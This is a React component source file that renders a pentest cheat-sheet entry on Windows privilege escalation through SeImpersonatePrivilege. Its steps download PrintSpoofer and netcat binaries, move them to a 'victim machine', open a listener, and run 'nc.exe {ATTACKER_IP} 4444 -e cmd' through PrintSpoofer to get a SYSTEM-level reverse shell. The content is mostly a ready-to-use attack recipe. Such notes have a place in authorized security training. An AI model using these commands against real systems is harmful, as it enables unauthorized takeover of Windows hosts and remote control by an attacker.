import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SeImpersonatePrivilege = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeImpersonatePrivilege policy setting determines which
              programs are allowed to imersonate a user or another specified
              account and act on behalf of the user. Legitimate programs may
              utilize SeImpersonatePrivilege to gain additional privileges.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Chech privileges for{" "}
              <Typography className="highlight" display="inline">
                SeImpersonatePrivilege
              </Typography>
            </Typography>
            <img
              src="/seimpersonateprivilege.png"
              height={266}
              width={672}
            />
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Download PrintSpoofer.</Typography>
            <Box sx={{ m: 2 }} />
            <Typography>32-bit</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <Typography>64-bit</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>Download Netcat</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://github.com/int0x33/nc.exe/raw/master/nc.exe"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Transfer PrintSpoofer and Netcat to victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>Start a Netcat listener on Attacker machine</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"nc -lvnp 4444"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>
              Execute PrintSpoofer. `-c "c:\tools\nc.exe &lt;ATTACKER_IP&gt;
              4444 -e cmd"` is to execute a command. We are using `nc.exe` to
              spawn a reverse shell.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                'c:\\tools\\PrintSpoofer.exe -c "c:\\tools\\nc.exe {ATTACKER_IP} 4444 -e cmd"'
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 7</Typography>
            <Typography>
              After executing PrintSpoofer, you should have a reverse shell on
              your Attacker machine as Nt Authority\System.
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeImpersonatePrivilege;
